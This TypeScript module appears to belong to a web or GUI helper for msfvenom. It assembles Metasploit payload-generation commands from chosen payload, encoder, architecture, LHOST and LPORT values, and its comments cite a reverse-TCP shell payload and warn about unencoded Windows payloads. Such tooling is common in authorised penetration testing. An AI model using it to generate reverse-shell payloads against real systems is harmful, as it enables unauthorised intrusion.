import type { ArchId } from "./archs";
import type { MsfvenomEncoder } from "./encoders";
import type { MsfvenomFormat } from "./formats";
import type { ExitfuncId } from "./params";
import type { MsfvenomPayload } from "./payloads";

export interface MsfvenomSelection {
  payload: MsfvenomPayload;
  arch: ArchId | null;
  format: MsfvenomFormat;
  encoder: MsfvenomEncoder;
  iterations: number;
  lhost: string;
  lport: number;
  exitfunc: ExitfuncId | null;
  filename: string;
  extraOptions: string;
}

/** Substitutes the "{arch}" path-segment token for Linux/macOS payloads (e.g.
 *  linux/{arch}/shell_reverse_tcp -> linux/x64/shell_reverse_tcp); flag-only payload ids pass
 *  through unchanged regardless of arch, since their arch is expressed via -a instead. */
export function resolvePayloadId(payload: MsfvenomPayload, arch: ArchId | null): string {
  return payload.archPlacement === "path-segment" && arch ? payload.id.replace("{arch}", arch) : payload.id;
}

export function suggestFilename(payload: MsfvenomPayload, format: MsfvenomFormat, arch: ArchId | null): string {
  const withArch = arch && format.category === "executable" ? `${payload.filenameSlug}_${arch}` : payload.filenameSlug;
  return format.extension ? `${withArch}.${format.extension}` : withArch;
}

/** Pure, deterministic command builder — flag order:
 *  msfvenom -p <resolved> -f <format> [-e <encoder> -i <n>] [-a <arch>] LHOST= LPORT=
 *  [EXITFUNC=] [<extra options>] [-o <filename>] */
export function buildCommand(sel: MsfvenomSelection): string {
  const parts: string[] = ["msfvenom", "-p", resolvePayloadId(sel.payload, sel.arch), "-f", sel.format.id];

  if (sel.encoder.id !== "none") {
    parts.push("-e", sel.encoder.id, "-i", String(sel.iterations));
  }

  if (sel.arch && sel.payload.archPlacement === "flag-only") {
    parts.push("-a", sel.arch);
  }

  parts.push(`LHOST=${sel.lhost}`, `LPORT=${String(sel.lport)}`);

  if (sel.exitfunc) {
    parts.push(`EXITFUNC=${sel.exitfunc}`);
  }

  const extra = sel.extraOptions.trim();
  if (extra.length > 0) {
    parts.push(extra);
  }

  if (sel.format.producesFile) {
    parts.push("-o", sel.filename);
  }

  return parts.join(" ");
}

export function buildBashVariable(command: string): string {
  return `CMD="${command}"\n$CMD`;
}

export function buildListenerParamsOnly(sel: MsfvenomSelection): string {
  return `LHOST=${sel.lhost} LPORT=${String(sel.lport)}`;
}

/** Live/pre-generate risk check (spec's "no encoder on Windows" warning) — pure so it's usable
 *  both for the inline picker-state warning and a post-generate summary. */
export function hasNoEncoderRisk(payload: MsfvenomPayload, encoder: MsfvenomEncoder): boolean {
  return payload.platform === "windows" && encoder.id === "none";
}
